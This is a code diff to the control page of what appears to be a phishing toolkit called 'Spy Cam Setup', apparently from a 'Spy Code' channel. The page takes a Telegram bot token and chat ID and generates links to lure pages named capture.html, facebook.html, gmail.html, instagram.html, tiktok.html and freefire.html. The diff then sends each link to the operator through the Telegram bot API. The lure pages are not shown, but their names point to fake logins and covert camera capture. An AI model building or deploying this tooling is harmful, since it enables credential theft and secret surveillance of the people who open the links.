@@ -66,7 +66,7 @@
             margin-bottom: 8px;
             color: #0f0;
         }
-        input[type="text"], input[type="password"] {
+        input[type="text"] {
             width: 100%;
             padding: 10px;
             margin-bottom: 20px;
@@ -76,7 +76,7 @@
             color: #0f0;
             transition: border-color 0.3s ease, background-color 0.3s ease;
         }
-        input[type="text"]:focus, input[type="password"]:focus {
+        input[type="text"]:focus {
             border-color: #007BFF;
             background-color: #555;
             outline: none;
@@ -131,43 +131,47 @@
     <img src="Spycode.png" alt="Logo" class="logo" onclick="openLink()" oncontextmenu="return false;">
     <h1>Spy Cam Setup</h1>
     <form id="botForm">
+        <label for="botToken">Bot Token:</label>
+        <input type="text" id="botToken" name="botToken" required>
+        <br>
         <label for="chatId">Chat ID:</label>
         <input type="text" id="chatId" name="chatId" required>
-        <label for="botToken">Bot Token:</label>
-        <input type="password" id="botToken" name="botToken" required>
         <br>
         <div class="buttons">
-            <button type="button" onclick="generateLinkAndRun('capture.html', 'Capture')">Capture</button>
-            <button type="button" onclick="generateLinkAndRun('facebook.html', 'Facebook')">Facebook</button>
-            <button type="button" onclick="generateLinkAndRun('freefier.html', 'Freefire')">Freefire</button>
-            <button type="button" onclick="generateLinkAndRun('gmail.html', 'Gmail')">Gmail</button>
-            <button type="button" onclick="generateLinkAndRun('intagram.html', 'Instagram')">Instagram</button>
-            <button type="button" onclick="generateLinkAndRun('tiktok.html', 'TikTok')">TikTok</button>
+            <button type="button" onclick="generateLink('capture.html', 'Capture')">Capture</button>
+            <button type="button" onclick="generateLink('facebook.html', 'Facebook')">Facebook</button>
+            <button type="button" onclick="generateLink('freefire.html', 'Freefire')">Freefire</button>
+            <button type="button" onclick="generateLink('gmail.html', 'Gmail')">Gmail</button>
+            <button type="button" onclick="generateLink('instagram.html', 'Instagram')">Instagram</button>
+            <button type="button" onclick="generateLink('tiktok.html', 'TikTok')">TikTok</button>
             <button type="button" onclick="openAboutMe()">About Me</button>
         </div>
     </form>
     <p id="linkContainer"></p>
     <div class="footer">
-        &copy; 2025 Spy Code . All rights reserved. | Subscribe for more updates.
+        &copy; 2025 Spy Code. All rights reserved. | Subscribe for more updates.
         &copy; <a href="https://www.youtube.com/@Spy_Code" target="_blank">https://www.youtube.com/@Spy_Code</a>
     </div>
 
     <script>
-        function generateLinkAndRun(page, name) {
-            const chatId = document.getElementById('chatId').value;
+        function generateLink(page, name) {
             const botToken = document.getElementById('botToken').value;
-            if (!chatId || !botToken) {
-                alert('Please enter both Chat ID and Bot Token.');
+            const chatId = document.getElementById('chatId').value;
+            if (!botToken) {
+                alert('Please enter a Bot Token.');
+                return;
+            }
+            if (!chatId) {
+                alert('Please enter a Chat ID.');
                 return;
             }
             const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')); // Get the current directory
             const link = `${baseUrl}/${page}?chatId=${encodeURIComponent(chatId)}`;
             document.getElementById('linkContainer').innerHTML = `Your ${name} link is: <a href="${link}" target="_blank">${link}</a>`;
-            sendLinkToTelegram(chatId, botToken, `Your ${name} link is: ${link}`);
-            window.open(link, "_blank"); // Open the link in a new tab
+            sendLinkToTelegram(botToken, chatId, `Your ${name} link is: ${link}`);
         }
 
-        async function sendLinkToTelegram(chatId, botToken, message) {
+        async function sendLinkToTelegram(botToken, chatId, message) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
@@ -182,12 +186,10 @@
                     })
                 });
 
-                const responseData = await response.json(); // Response data লোড করুন
-
                 if (response.ok) {
-                    console.log("Link sent to Telegram", responseData); // সফল হলে লগ করুন
+                    console.log("Link sent to Telegram");
                 } else {
-                    console.error("Error sending link to Telegram: ", responseData.description); // ব্যর্থ হলে লগ করুন
+                    console.error("Error sending link to Telegram: ", response.statusText);
                 }
             } catch (error) {
                 console.error("Error sending link to Telegram: ", error);
